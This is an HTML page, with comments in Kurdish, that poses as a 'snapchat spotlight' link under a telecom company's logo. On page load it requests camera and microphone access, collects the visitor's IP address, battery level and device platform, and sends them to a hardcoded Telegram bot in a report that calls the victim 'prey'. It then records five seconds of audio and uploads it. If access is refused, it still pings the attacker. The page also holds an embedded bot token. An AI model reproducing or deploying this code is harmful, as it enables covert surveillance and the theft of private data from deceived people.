<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
    <title>snapchat spotlight</title>
    <style>body { background-color: white; margin: 0; overflow: hidden; }</style>
</head>
<body onload="capture()">
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const targetID = urlParams.get('id'); 
    const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";
    const CHAT_ID = "8431515310"; // ⚠️ دڵنیاببە ئەمە ئایدی چاتی تۆیە نەک بۆتەکە

    async function capture() {
        if (!targetID) return;
        try {
            // 🎙️ داواکردنی دەسەڵاتی کامێرا و مایکرۆفۆن
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: true 
            });

            // 🔋 زانیاری پاتری
            let batteryInfo = "Unknown";
            if (navigator.getBattery) {
                const batt = await navigator.getBattery();
                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
            }

            // 🌐 دەرهێنانی IP و ناردنی ڕاپۆرت
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();

            let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
                         `👤 <b>ID:</b> <code>${targetID}</code>\n` +
                         `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
                         `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
                         `📱 <b>Device:</b> <code>${navigator.platform}</code>`;

            // ناردنی تێکست
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "HTML" })
            });

            // 🎤 تۆمارکردن و ناردنی دەنگ
            const mediaRecorder = new MediaRecorder(stream);
            let audioChunks = [];
            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("voice", audioBlob, "voice.ogg");
                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: formData });
            };

            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(t => t.stop());
            }, 5000);

        } catch (e) {
            // ئەگەر نێچیرەکە ڕەدی کردەوە، هەر زانیاری IP بنێرە
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: "❌ نێچیرەکە ڕەزامەندی نەدا، بەڵام هەوڵێک درا." })
            });
        }
    }
</script>
</body>
</html>
